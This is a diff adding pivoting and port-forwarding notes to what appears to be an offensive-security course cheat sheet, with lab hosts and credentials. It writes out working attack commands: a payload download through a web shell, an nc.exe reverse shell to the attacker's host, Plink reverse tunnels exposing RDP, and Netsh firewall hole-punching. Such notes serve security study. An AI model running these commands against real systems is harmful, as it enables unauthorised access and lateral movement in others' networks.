@@ -1578,6 +1578,68 @@ Reference
   - Scanning MULTISERVER03 through the remote dynamic SOCKS port with Proxychains > 80, 135, 3389  
     `proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.133.64` (change to internal server 10.4.xxx.64)
 - sshuttle
+  - sshuttle is a tool that turns an SSH connection into something like a VPN by setting up local routes that force. Requires root privileges on the SSH client and Python3 on the SSH server  
+  - Forwarding port 2222 on CONFLUENCE01 to port 22 on PGDATABASE01  
+    `confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22`
+  - Running sshuttle from our Kali machine, pointing to the forward port on CONFLUENCE01  
+    `kali@kali:~$ sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24`
+  - Connecting to the SMB share on HRSHARES, without any explicit forwarding > scripts  
+    `kali@kali:~$ smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234`  
+- Port Forwarding with windows tool ssh.exe  
+  - Starting SSH server on the Kali machine.  
+    `kali@kali:~$ sudo systemctl start ssh`
+  - Connecting to the RDP server on **MULTISERVER03** using xfreerdp  
+    `kali@kali:~$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64`
+  - Finding ssh.exe on MULTISERVER03 > C:\Windows\System32\OpenSSH\ssh.exe  
+    `C:\Users\rdp_admin>where ssh` `ssh.exe -V` (higher than 7.6 can use for remote dynamic port forward)  
+  - Connecting back to our Kali machine to open the remote dynamic port forward  
+    `C:\Users\rdp_admin>ssh -N -R 9998 kali@192.168.118.4`  
+  - update /etc/proxychains4.conf to use this socket  
+    `socks5 127.0.0.1 9998`  
+  - Connecting to the PostgreSQL server with psql and Proxychains  
+    `kali@kali:~$ proxychains psql -h 10.4.50.215 -U postgres`  `postgres=# \l`  
+- Port Forwarding with windows tool Plink
+  - MULTISERVER03 is already “pre-compromised”. Browse /umbraco/forms.aspx on MULTISERVER03 to run arbitrary commands
+  - Starting Apache2  `kali@kali:~$ sudo systemctl start apache2`
+  - Copying nc.exe to the Apache2 webroot
+    `find / -name nc.exe 2>/dev/null` `sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/`  
+  - payload is downloaded from our Apache2 server to C:\Windows\Temp\nc.exe on MULTISERVER03.  
+    `powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe`
+  - The Netcat listener on our Kali machine `kali@kali:~$ nc -nvlp 4446`
+  - The nc.exe reverse shell payload we execute in the web shell  > c:\windows\system32\inetsrv>
+    `C:\Windows\Temp\nc.exe -e cmd.exe 192.168.118.4 4446`
+  - Copying plink.exe to our Apache2 webroot
+    `kali@kali:~$ find / -name plink.exe 2>/dev/null` `kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/`  
+  - Plink downloaded to the C:folder
+    `c:\windows\system32\inetsrv>powershell wget -Uri http://192.168.118.4/plink.exe -OutFile C:\Windows\Temp\plink.exe`
+  - using Plink (PuTTY Link) to create an SSH reverse tunnel from a victim windows machine back to your attacker-controlled SSH server at 192.168.118.4 (reverse tunnel: binds 127.0.0.1:9833 on SSH server, forwards 3389 on victim)
+    `c:\windows\system32\inetsrv>C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4`
+  - OR automatically confirm a host key confirmation:
+    `cmd.exe /c echo y | ..exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7`
+  - Connecting to the RDP server with xfreerdp, through the Plink port forward
+    `kali@kali:~$ xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833`
+- Port Forwarding with windows tool Netsh (needs admin)
+  - built-in firewall configuration tool Netsh (also known as Network Shell).
+  - CONFLUENCE01 is no longer accessible. MULTISERVER03 is serving its web application on TCP port 80
+  - RDP directly into MULTISERVER03 from  Kali
+    `kali@kali:~$ xfreerdp3 /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64`
+  - instruct netsh interface to add a portproxy rule from an IPv4 listener that is forwarded to an IPv4 port (v4tov4). This will listen on port 2222 on the external-facing interface (listenport=2222 listenaddress=192.168.50.64) and forward packets to port 22 on PGDATABASE01 (connectport=22 connectaddress=10.4.50.215). > no output receive but port open
+    `C:\Windows\system32>netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215`
+  - netstat showing that TCP/2222 is listening on the external interface. > 192.168.50.64:2222
+    `C:\Windows\system32>netstat -anp TCP | find "2222"`
+  - Listing all the portproxy port forwarders set up with Netsh
+    `C:\Windows\system32>netsh interface portproxy show all`
+  - We can’t connect to port 2222 from （FW block) > filtered
+    `sudo nmap -sS 192.168.50.64 -Pn -n -p2222`
+  - Poking a hole in the Windows Firewall with Netsh
+    `C:\Windows\system32> netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow`
+  - SSHing into PGDATABASE01 through the Netsh port forward
+    `kali@kali:~$ ssh database_admin@192.168.50.64 -p2222`
+  - Deleting the firewall rule with Netsh
+    `C:\Users\Administrator>netsh advfirewall firewall delete rule name="port_forward_ssh_2222"`
+  - Deleting the port forwarding rule with Netsh
+    `C:\Windows\Administrator> netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64`
+
 ### 20. Tunneling through deep packet inspectation
 ### 21. The metassploit framework
 ### 22. Active directory introduction and enumeration
